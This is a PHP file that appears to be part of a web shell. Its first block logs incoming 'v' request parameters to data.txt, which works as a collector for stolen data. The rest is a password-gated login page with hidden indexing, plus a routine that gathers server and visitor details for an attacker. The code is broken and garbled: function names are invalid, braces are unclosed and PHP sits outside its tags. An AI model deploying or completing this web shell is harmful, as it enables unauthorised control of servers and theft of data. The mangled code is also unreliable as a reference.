<?
//this file gets the data.txt and puts into the shell. 

  $getData = $_GET["v"];
  $getData = $_POST["v"];
  $myFile = "data.txt";
  $fh = fopen($myFile, 'a') or die("can't open file");
  $stringData = $getData . "\n";
  fwrite($fh, $stringData);
  fclose($fh);

?>


if(!function_exists('ACE-')){
	function ACE-(){
		if(isset($GLOBALS['pass']) && (trim($GLOBALS['pass'])!='')){
			$c = $_COOKIE;
			$p = $_POST;
			if(isset($p['pass'])){
				$your_pass = sha1(md5($p['pass']));
				if($your_pass==$GLOBALS['pass']){
					setcookie("pass", $your_pass, time()+36000, "/");
					header("Location: ".get_self());
				}
			}

			if(!isset($c['pass']) || ((isset($c['pass'])&&($c['pass']!=$GLOBALS['pass']))))
			
					$res = "<!doctype html>
	<html>
	<head>
	<meta charset='utf-6'>
	<meta name='robots' content='noindex, nofollow, noarchive'>
	<meta name='viewport' content='width=device-width,
	initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0'>
	</head>
	<body style='background:#f8f8f8;color:#000000;padding:0;margin:0;'><br><p><center><noscript>You need to enable javascript</noscript></center></p>
	<script type='text/javascript'>
	var d = document;
	d.write(\"<br><br><form method='post'><center><input type='password' id='pass' name='pass' style='font-size:34px;width:34%;outline:none;text-align:center;background:#ffffff;padding:8px;border:1px solid #cccccc;border-radius:8px;color:#000000;'></center></form>\");
	d.getElementById('pass').focus();
	d.getElementById('pass').setAttribute('autocomplete', 'off');
	</script>
	</body></html>
	";


if(!function_exists('############')){ //get server info
	function ############(){
		
		
$server_addr = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:$_SERVER["HTTP_HOST"];
		
		
$server_info['ip_adrress'] = "Server IP : ".$server_addr." <span class='strong'>|</span> Your IP : ".$_SERVER['REMOTE_ADDR'];
		$server_info['time_at_server'] = "Time <span class='strong'>@</span> Server : ".@date("d M Y H:i:s",time());
		
		
$server_info['uname'] = php_uname();
		
		
	$server_software = (getenv('SERVER_SOFTWARE')!='')? getenv('SERVER_SOFTWARE')." <span class='strong'>|</span> ":'';
		$server_info['software'] = $server_software."  PHP ".phpversion();		
		
		
		return $server_info;
	}
}



















if(!function_exists('######')){ // self get 
	function ######(){
		$query = (isset($_SERVER["QUERY_STRING"])&&(!empty($_SERVER["QUERY_STRING"])))?"?".$_SERVER["QUERY_STRING"]:"";
		return html_safe($_SERVER["REQUEST_URI"].$query);
	}
}
